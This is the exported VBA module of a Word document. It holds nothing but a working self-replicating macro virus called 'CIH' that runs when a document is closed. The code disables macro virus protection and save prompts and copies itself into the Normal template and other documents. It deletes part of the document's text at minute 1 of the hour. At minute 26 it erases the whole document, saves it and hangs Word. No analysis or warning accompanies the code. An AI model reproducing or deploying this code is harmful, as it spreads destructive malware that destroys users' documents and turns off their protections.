   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
       CIH
   End Sub

   Private Sub CIH()
       On Error Resume Next
       Dim StartLoc, ProcLen, Obj, Str, i, s, Lose
       s = ActiveDocument.Saved: Application.EnableCancelKey = 0
       With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

       Set Obj = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
       StartLoc = Obj.ProcStartLine("CIH", 0): ProcLen = Obj.ProcCountLines("CIH", 0)
       Str = Obj.Lines(StartLoc, ProcLen)

       Set Obj = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
       i = Empty: i = Obj.ProcStartLine("CIH", 0)
       If i <> Empty Then
           Set Obj = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
           i = Empty: i = Obj.ProcStartLine("CIH", 0)
           If i <> Empty Then Obj = ""
       End If

       If Obj <> "" Then
           i = Empty: i = Obj.ProcStartLine("Document_Close", 0)
           If i = Empty Then
               Obj.InsertLines Obj.CountOfLines + 1, "Private Sub Document_Close()" & Chr(13) & "    CIH" & Chr(13) & "End Sub"
           Else
               Obj.InsertLines Obj.ProcStartLine("Document_Close", 0) + 1, "    CIH"
           End If
           Obj.InsertLines Obj.CountOfLines + 1, Str
       End If

       If Minute(Now) = 1 Then ActiveDocument.Range(ActiveDocument.Characters.Count / 2 * (1 - 0.1 * Rnd), ActiveDocument.Characters.Count / 2 * (1 + 0.1 * Rnd)) = ""
       If Minute(Now) = 26 Then ActiveDocument.Range(0, ActiveDocument.Characters.Count) = "": Lose = True
       If s = False Then ActiveDocument.Save
       If Lose = True And ActiveDocument.Saved Then Do: Loop
       ActiveDocument.Saved = True
   End Sub
